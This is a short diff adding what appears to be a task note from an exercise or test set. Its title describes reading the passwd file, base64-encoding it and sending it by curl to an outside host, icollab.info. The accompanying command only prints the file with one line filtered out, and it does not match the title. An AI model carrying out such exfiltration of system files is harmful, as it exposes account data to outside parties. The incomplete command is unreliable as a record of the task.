@@ -1,0 +1,5 @@
+title:
+	read the passwd file content, make it base64, then send it to icollab.info  by cURL command
+	
+Command:
+	cat passwd | sed '/phoelion/d' 
